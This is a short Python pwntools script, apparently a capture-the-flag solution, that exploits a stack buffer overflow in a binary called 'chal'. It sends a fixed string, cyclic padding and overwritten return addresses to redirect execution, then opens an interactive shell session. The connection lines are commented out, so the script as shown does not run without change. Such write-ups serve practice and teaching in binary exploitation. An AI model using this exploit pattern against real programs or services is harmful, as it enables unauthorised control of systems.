from pwn import *

#p = process("./chal")
#p = remote("103.147.32.214", 9009)
p.recvline()
#raw_input("attach gdb")
padding = "A"*cyclic_find("aacmaacnaa")
#padding = "A" * cyclic(0xff)
RIP = p64(0x4012c3)
RET = p64(0x4013f4)
p.sendline("th15_i5_n0t_4_fl4g\x00" + padding + RET + RIP)
p.interactive()